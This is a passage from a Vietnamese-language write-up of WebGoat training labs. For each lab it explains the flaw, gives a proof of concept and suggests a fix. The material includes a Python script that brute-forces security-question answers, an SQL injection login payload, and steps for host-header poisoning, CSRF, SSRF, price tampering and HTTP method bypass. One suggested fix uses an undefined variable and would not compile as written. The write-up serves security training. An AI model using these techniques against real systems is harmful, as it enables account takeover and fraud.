\u0026#34;gray\u0026#34;, \u0026#34;cyan\u0026#34;, \u0026#34;magenta\u0026#34;, \u0026#34;lime\u0026#34;, \u0026#34;teal\u0026#34;, \u0026#34;lavender\u0026#34;, \u0026#34;maroon\u0026#34;, \u0026#34;navy\u0026#34;, \u0026#34;olive\u0026#34;, \u0026#34;coral\u0026#34;, \u0026#34;turquoise\u0026#34;, \u0026#34;violet\u0026#34;, \u0026#34;gold\u0026#34;, \u0026#34;silver\u0026#34;, \u0026#34;beige\u0026#34;, \u0026#34;tan\u0026#34;, \u0026#34;peach\u0026#34;, \u0026#34;mint\u0026#34;, \u0026#34;indigo\u0026#34;, \u0026#34;aqua\u0026#34;] account = [\u0026#39;tom\u0026#39;, \u0026#39;admin\u0026#39;, \u0026#39;larry\u0026#39;] headers = { \u0026#39;Cookie\u0026#39;: \u0026#39;JSESSIONID=0FuKaJFAXbU6Yrw7EPUG24t4MySLL7BSwNIuQ18_\u0026#39; } URL = \u0026#34;http://localhost:8080/WebGoat/PasswordReset/questions\u0026#34; for acc in account: # username=fqw\u0026amp;securityQuestion=fqw for color in colors: data = { \u0026#34;username\u0026#34;: acc, \u0026#34;securityQuestion\u0026#34;: color } response = requests.post(URL, data=data, headers=headers) json = response.json() if \u0026#34;Sorry the solution is not correct\u0026#34; not in json[\u0026#34;feedback\u0026#34;]: print(f\u0026#34;[+] Username: {acc}\u0026#34;) print(f\u0026#34;[=\u0026gt;] Security Question: {color}\u0026#34;) break Chạy payload và thu được các câu hỏi bảo mật đúng của từng tài khoản người dùng Cách khắc phục #\rĐể các câu hỏi bảo mật khó đoán và không có một danh sách trả lời cố định. Ví dụ: Tên của con vật nuôi đầu tiên của bạn là gì? Tên trường tiểu học mà bạn đã học là gì? Tên của người bạn thân nhất thời thơ ấu của bạn là gì? Tên thành phố nơi bạn sinh ra là gì? Tên trường trung học mà bạn đã tốt nghiệp là gì? Lab 6 #\rNguyên nhân lỗi #\rKhông kiểm tra kỹ hết các header được sử dụng cho việc tạo link reset mật khẩu → Điều này khiến cho hacker có thể thao túng đường dẫn reset password và tạo ra một url giả để chiếm được đường dẫn reset password của người dùng. public AttackResult sendPasswordResetLink( @RequestParam String email, HttpServletRequest request) { String resetLink = UUID.randomUUID().toString(); ResetLinkAssignment.resetLinks.add(resetLink); String host = request.getHeader(HttpHeaders.HOST); if (ResetLinkAssignment.TOM_EMAIL.equals(email) \u0026amp;\u0026amp; (host.contains(webWolfPort) \u0026amp;\u0026amp; host.contains(webWolfHost))) { // User indeed changed the host header. ResetLinkAssignment.userToTomResetLink.put(getWebSession().getUserName(), resetLink); fakeClickingLinkEmail(webWolfURL, resetLink); } else { try { sendMailToUser(email, host, resetLink); } catch (Exception e) { return failed(this).output(\u0026#34;E-mail can\u0026#39;t be send. please try again.\u0026#34;).build(); } } return success(this).feedback(\u0026#34;email.send\u0026#34;).feedbackArgs(email).build(); } Cụ thể ở đây là header HOST không được dùng để kiểm tra phần ip lẫn phần port. Điều này khiến việc tấn công có thể xảy ra bằng cách thay đổi đường dẫn được gửi đến người dùng. Khi người dùng nhấn vào đường dẫn Reset trong mail thì hacker có thể cướp được mã reset password này. POC #\rGửi một request để yêu cầu reset password, dùng burp suite để bắt lại request này. Thay đổi header HOST thành host của WebWolf, thay đổi email thành email của nạn nhân (Ở đây là tom - tom@webgoat-cloud.org). Gửi Request và đợi Tom nhấn vào đường dẫn đổi mật khẩu. Vào phần /requests của WebWolf và thấy một request reset mật khẩu Dùng đường dẫn này, đổi port lại thành 8080 để truy cập vào trang đổi mật khẩu thật. Thay đổi mật khẩu và mật khẩu của tài khoản Tom sẽ bị thay đổi. Cách khắc phục #\rKiểm tra và xác thực tiêu đề Host: Đảm bảo rằng tiêu đề Host được xác thực và chỉ chấp nhận từ các nguồn đáng tin cậy. public AttackResult sendPasswordResetLink( @RequestParam String email, HttpServletRequest request) { String resetLink = UUID.randomUUID().toString(); ResetLinkAssignment.resetLinks.add(resetLink); String host = request.getHeader(HttpHeaders.HOST); String expectedHost = \u0026#34;yourtrustedhost.com\u0026#34;; if (ResetLinkAssignment.TOM_EMAIL.equals(email) \u0026amp;\u0026amp; (host.contains(webWolfPort) \u0026amp;\u0026amp; host.contains(webWolfHost))) { // User indeed changed the host header. ResetLinkAssignment.userToTomResetLink.put(getWebSession().getUserName(), resetLink); fakeClickingLinkEmail(webWolfURL, resetLink); } else { try { if (hostHeader == null || !hostHeader.equalsIgnoreCase(expectedHost)) { return failed(this).output(\u0026#34;Invalid host header.\u0026#34;).build(); } else { sendMailToUser(email, host, resetLink); } } catch (Exception e) { return failed(this).output(\u0026#34;E-mail can\u0026#39;t be send. please try again.\u0026#34;).build(); } } return success(this).feedback(\u0026#34;email.send\u0026#34;).feedbackArgs(email).build(); } Secure Password #\rNhập một mật khẩu có chứ ký tự viết hoa, chữ thường, ký tự số và ký tự đặc biệt Vi dụ: Test99482@1231! (A8) Insecure Deserialization #\r(A9) Security Logging Failures #\rLogging Security #\rLab 2 #\rỞ đây, chỉ cần đăng nhập vào với username là admin để được lưu vào trong log là được. → Mục đích của lỗ hổng này là nếu như có một tính năng đọc log hoặc hiển thị log mà không được filter kỹ thì sẽ có thể chèn được các payload tấn công liên quan đến injection vào hệ thống.\nLab 4 #\rKhi boot một máy chủ, mật khẩu của admin sẽ được hiển thị trong log. Chỉ cần lấy password này ở trong log, tuy nhiên password đã bị mã hóa. Cụ thể là bị mã hóa Base64 @PostConstruct public void generatePassword() { password = UUID.randomUUID().toString(); log.info( \u0026#34;Password for admin: {}\u0026#34;, Base64.getEncoder().encodeToString(password.getBytes(StandardCharsets.UTF_8))); } Giải mã và đăng nhập lại với tài khoản mà mật khẩu Admin:\u0026lt;decoded password\u0026gt; (A10) Server-side Request Forgery (A10) Server-side Request Forgery #\rCross-Site Request Forgeries #\rBasic Get CSRF Exercise #\rNguyên nhân lỗi: #\rPhía server chỉ đơn giản là kiểm tra dựa vào header Referer mà không sử dụng thêm csrf token để phòng tránh bị tấn công CSRF, điều này khiến cho hacker có thể thay đổi Referer để có thể thực hiện tấn công CSRF. // ... String host = (req.getHeader(\u0026#34;host\u0026#34;) == null) ? \u0026#34;NULL\u0026#34; : req.getHeader(\u0026#34;host\u0026#34;); String referer = (req.getHeader(\u0026#34;referer\u0026#34;) == null) ? \u0026#34;NULL\u0026#34; : req.getHeader(\u0026#34;referer\u0026#34;); String[] refererArr = referer.split(\u0026#34;/\u0026#34;); // ... if (referer.equals(\u0026#34;NULL\u0026#34;)) { if (\u0026#34;true\u0026#34;.equals(req.getParameter(\u0026#34;csrf\u0026#34;))) { Random random = new Random(); userSessionData.setValue(\u0026#34;csrf-get-success\u0026#34;, random.nextInt(65536)); response.put(\u0026#34;success\u0026#34;, true); response.put(\u0026#34;message\u0026#34;, pluginMessages.getMessage(\u0026#34;csrf-get-null-referer.success\u0026#34;)); response.put(\u0026#34;flag\u0026#34;, userSessionData.getValue(\u0026#34;csrf-get-success\u0026#34;)); } else { Random random = new Random(); userSessionData.setValue(\u0026#34;csrf-get-success\u0026#34;, random.nextInt(65536)); response.put(\u0026#34;success\u0026#34;, true); response.put(\u0026#34;message\u0026#34;, pluginMessages.getMessage(\u0026#34;csrf-get-other-referer.success\u0026#34;)); response.put(\u0026#34;flag\u0026#34;, userSessionData.getValue(\u0026#34;csrf-get-success\u0026#34;)); } } else if (refererArr[2].equals(host)) { response.put(\u0026#34;success\u0026#34;, false); response.put(\u0026#34;message\u0026#34;, \u0026#34;Appears the request came from the original host\u0026#34;); response.put(\u0026#34;flag\u0026#34;, null); } else { Random random = new Random(); userSessionData.setValue(\u0026#34;csrf-get-success\u0026#34;, random.nextInt(65536)); response.put(\u0026#34;success\u0026#34;, true); response.put(\u0026#34;message\u0026#34;, pluginMessages.getMessage(\u0026#34;csrf-get-other-referer.success\u0026#34;)); response.put(\u0026#34;flag\u0026#34;, userSessionData.getValue(\u0026#34;csrf-get-success\u0026#34;)); } // ... POC #\rCó 2 cách để tấn công CSRF vào assign này: Thay đổi header Referer để nó khác với Host Xóa header Referer khỏi Request Thay đổi header Referer để nó khác với Host Ở đoạn code này, chương trình thực hiện so sánh 2 giá trị của 2 header là Host và Referer, nếu 2 giá trị như nhau thì không hợp lệ. Thực hiện bắt request lại và thay đổi header Referer sang giá trị khác với Host Hoặc tạo một file html với request form đến trang gốc lên WebWolf sau đó gửi form. Xóa header Referer khỏi Request Ở đoạn code này, khi header Referer rỗng thì chương trình sẽ kiểm tra giá trị của tham số csrf . Nếu giá trị này là true hoặc không thì chương trình vẫn sẽ trả về flag. Cách khắc phục #\rSử dụng Allow List để xác thực header Referer Tạo ra một mã csrfToken để xác thực, tránh việc bị tấn công CSRF. Không dựa vào header Referer Post a review on someone else’s behalf #\rNguyên nhân lỗi #\rNhư ở bài lab trên\nPOC #\rGửi một review, sau đó dùng burp suite để bắt request này và gửi đến Repeater để chỉnh sửa. Thay đổi header Referer thành một địa chỉ IP khác rồi gửi request Cách khắc phục #\rCSRF and content-type #\rNguyên nhân lỗi #\rNhư 2 lab trên, vẫn do việc không kiểm tra kỹ các header của request // ... private boolean hostOrRefererDifferentHost(HttpServletRequest request) { String referer = request.getHeader(\u0026#34;Referer\u0026#34;); String host = request.getHeader(\u0026#34;Host\u0026#34;); if (referer != null) { return !referer.contains(host); } else { return true; } } // ... Ở lab này, chương trình có check lại header Content-Type phải là kiểu text/plain . POC #\rThực hiện bắt một request khi gửi một Feedback, sau đó gửi request này sang Repeater để chỉnh sửa. Thay đổi Content-Type thành text Thay đổi Referer khác với Host Gửi request để bypass Server-Side Request Forgery #\rNguyên nhân lỗi #\rThiếu Kiểm Tra URL Đầu Vào: Mã này nhận một URL thông qua tham số url mà không thực hiện kiểm tra bảo mật hoặc xác thực URL đầu vào. Điều này có thể dẫn đến một lỗ hổng SSRF nếu mã thực hiện các yêu cầu HTTP tới URL không đáng tin cậy. Hạn Chế URL Không Đủ: Mặc dù mã này chỉ kiểm tra hai URL cụ thể (images/tom.png và images/jerry.png), nhưng nếu mã không hạn chế đúng cách và không có biện pháp bảo vệ khác, nó có thể dễ bị tấn công nếu có thể lợi dụng để thực hiện yêu cầu tới các dịch vụ nội bộ khác. POC #\rThực hiện request để lấy tài nguyên là tom.png, dùng burp suite để bắt request này. Thay đổi tham số url từ images%2Ftom.png thành images%2Fjerry.png rồi send request Thay đổi URL thành một URL khác để truy cập vào tài nguyên - thực hiện tấn công SSRF, ở đây sẽ là http://ifconfig.pro Cách khắc phục #\rSử dụng White List để hạn chế việc bị tấn công SSRF Kiểm tra xác thực đầu vào của tham số URL Kiểm tra địa chỉ mạng nội bộ, đảm bảo URL không truy cập vào các địa chỉ nội bộ loopback Client side #\rBypass front-end restrictions #\rNguyên nhân lỗi (Chung) #\rĐặt RegEx ở phía Client, khiến cho việc kiểm tra dễ dàng bypass. Lab 2 #\rGửi request, sau đó bắt request này và gửi sang Repeater. Thay đổi các trường dữ liệu thành các value nằm ngoài giá trị có sẵn. Sau đó gửi request để bypass Lab 3 #\rGửi request và bắt request này lại gửi sang Repeater. Sau đó, thực hiện thay đổi các trường giá trị thành các giá trị nằm ngoài regex và gửi request. Cách khắc phục (Chung) #\rĐặt Regex ở phía Client, sau đó nhận giá trị từ phía Client và sử lý thêm một lần nữa ở phía Server để chắc chắn dữ liệu được định dạng đúng với mong muốn của lập trình viên. Client side filtering #\rLab 2 #\rNguyên nhân lỗi #\rServer không sử dụng userId để kiểm tra và trả về đúng thông tin của userId mà trả về tất cả thông tin của tất cả người dùng. POC #\rKhi thực hiện xem lương một người dùng thì có một request được gửi lên server và server sẽ trả về toàn bộ danh sách của tất cả người dùng Cách khắc phục #\rKhông nên dùng userId để làm tham số kiểm tra, nên sử dụng json web token để mã hóa/giải mã, rồi sử dụng thông tin được giải mã để cung cấp thông tin cho đúng người dùng hợp lệ Lab 3 #\rNguyên nhân lỗi #\rLập trình viên để lộ một url hiển thị toàn bộ danh sách các coupons POC #\rTruy cập vào đường dẫn /coupons để xem danh sách tất cả các mã giảm giá. Sử dụng code get_it_for_free có discount là 100 Cách khắc phục #\rThêm quyền cho đường dẫn /coupons chỉ để admin có thể truy cập được hoặc là xóa luôn đường dẫn này. HTML tampering #\rNguyên nhân lỗi #\rPhía server không thực hiện việc lưu trữ và kiểm tra tổng giá trị của một đơn hàng khi Client gửi yêu cầu, mà chỉ sử dụng trực tiếp giá trị được lưu trữ trên phía Client để xử lý. Điều này khiến cho khi mà giá trị ở phía Client bị thay đổi thì phía Server sẽ bị attack. POC #\rThực hiện việc gửi request, chặn gói tin này thì có phát hiện một trường dữ liệu là Total đang chứa tổng giá trị đơn hàng. Gửi request này sang Repeater, thay đổi giá trị của Total thành 0 và send request Cách khắc phục #\rThực hiện gửi mã id, số lượng của sản phẩm lên server. Sau đó, server sẽ kiểm tra tính hợp lệ của id và số lượng sản phẩm → Tính tổng số tiền của đơn hàng đó rồi mới gửi giá trị về cho người dùng tiến hành thanh toán. Challenges Challenges #\rAdmin lost password #\rPOC #\rTải ảnh ở trang Login về, phân tích ảnh này thì phát hiện tài khoản và mật khẩu của tài khoản admin. Đăng nhập với thông tin trên thì nhận được flag Without password #\rỞ thử thách này, khi chèn payload để thử SQL Injection thì phát hiện ở field password mắc phải SQL Injection. Sử dụng Payload sau để đăng nhập thành công username: Larry password: \u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1 Admin password reset #\rKhi recon thì phát hiện ở trang web này có một đường dẫn là /.git Truy cập đường dẫn này và tải về một folder git Phân tích git thì xem được source code của thử thách này Dưới đây là đoạn code được dùng để tạo mã reset public class PasswordResetLink { public String createPasswordReset(String username, String key) { Random random = new Random(); if (username.equalsIgnoreCase(\u0026#34;admin\u0026#34;)) { // Admin has a fix reset link random.setSeed(key.length()); } return scramble(random, scramble(random, scramble(random, MD5.getHashString(username)))); } public static String scramble(Random random, String inputString) { char[] a = inputString.toCharArray(); for (int i = 0; i \u0026lt; a.length; i++) { int j = random.nextInt(a.length); char temp = a[i]; a[i] = a[j]; a[j] = temp; } return new String(a); } public static void main(String[] args) { if (args == null || args.length != 2) { System.out.println(\u0026#34;Need a username and key\u0026#34;); System.exit(1); } String username = args[0]; String key = args[1]; System.out.println(\u0026#34;Generation password reset link for \u0026#34; + username); System.out.println( \u0026#34;Created password reset link: \u0026#34; + new PasswordResetLink().createPasswordReset(username, key)); } } Chạy lại đoạn code trên với username là admin Mã hash của admin là:375afe1104f4a487a73823c50a9292a2 . Truy cập bằng mã hash này thì nhận được flag\nWithout account #\rNguyên nhân gây lỗi là server chỉ kiểm tra nếu không phải phương thức GET trong khi dùng GetMapping → Chỉ cần đổi sang phương thức HEAD Đổi method GET thành HEAD để lấy được flag ","date":"21 August 2024","externalUrl":null,"permalink":"/posts/webgoat/","section":"Posts","summary":"Web Goat Writeup","title":"Web Goat Writeup","type":"posts"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]